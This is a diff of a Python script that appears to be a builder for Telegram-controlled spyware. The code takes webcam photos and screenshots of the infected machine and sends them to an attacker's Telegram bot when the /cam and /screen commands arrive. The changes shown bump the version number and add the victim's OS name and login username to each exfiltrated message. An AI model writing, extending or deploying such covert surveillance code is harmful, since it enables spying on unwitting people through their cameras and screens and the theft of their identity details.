@@ -50,7 +50,7 @@ r"""
 def main():
 	
 	print(random.choice(banners))
-	print("Version 0.1(beta)")
+	print("Version 0.2(beta)")
 	tk=str(input("Telegram bot api token: "))
 	proc=str(input("Process name (no file extension): "))
 	#print("Admin id :");admin=int(input())
@@ -64,7 +64,7 @@ def main():
 import time
 import cv2# CODE BY SUDOREBOOT2020
 import telebot
-
+import os
 def camera():
 	
 	# Включаем первую камеру
@@ -107,14 +107,20 @@ def otpravka():
 	@bot.message_handler(commands=['screen'])
 	def welcome_start(message):
 		screen()
-		bot.send_message(message.chat.id, 'screen :')
+		syss=os.name
+		syss_2=os.getlogin() 
+		ooo='sys:'+str(syss)+' user:'+str(syss_2)+' screen:'
+		bot.send_message(message.chat.id,ooo)
 		#file = open('cam1.png', 'rb')
 		file_2=open('screen1.png', 'rb')
 		bot.send_photo(message.chat.id, file_2)
 	@bot.message_handler(commands=['cam'])
 	def welcome_start(message):
-		camera()		
-		bot.send_message(message.chat.id, 'camera photo')
+		camera()	
+		syss=os.name
+		syss_2=os.getlogin() 
+		ooo='sys:'+str(syss)+' user:'+str(syss_2)+' camera photo:'	
+		bot.send_message(message.chat.id, ooo)
 		file = open('cam1.png', 'rb')
 		#file_2=open('screen1.png', 'rb')
 		bot.send_photo(message.chat.id, file)
